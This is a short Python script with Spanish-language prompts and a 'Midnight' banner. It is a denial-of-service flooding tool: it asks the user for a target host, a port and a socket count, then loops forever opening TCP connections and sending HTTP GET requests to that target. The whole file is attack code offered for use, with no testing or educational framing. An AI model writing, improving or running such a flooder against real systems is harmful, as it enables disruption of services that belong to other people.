import socket
import os
import sys
import time

def send_http_packets(host, port, num_sockets, message, msg_len):
    while True:
        sent_packets = 0
        for i in range(num_sockets):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((host, port))
                s.sendall(message[:msg_len])
                sent_packets += 1
            except socket.error as e:
                print(f"Error al enviar paquete: {e}")
            finally:
                s.close()
        
        print(f"Paquetes enviados: {sent_packets}/{num_sockets}")

if __name__ == '__main__':
    os.system("clear")
    os.system("figlet Midnight")
    print("Created by Santh'M w/ DevilASN, Beta v1.0.1")
    host = input("Ingrese la dirección del host (URL o IP): ")
    port = int(input("Ingrese el puerto: "))
    
    num_sockets = int(input("Ingrese la cantidad de sockets a enviar: "))
    
    message = b'GET / HTTP/1.0\r\n\r\n'
    msg_len = int(input("Ingrese la cantidad de bytes a enviar en el mensaje: "))
    print("Cargando Sockets... (Este tiempo puede variar dependiendo de la cantidad de sockets y la conexion)")
    
    send_http_packets(host, port, num_sockets, message, msg_len)
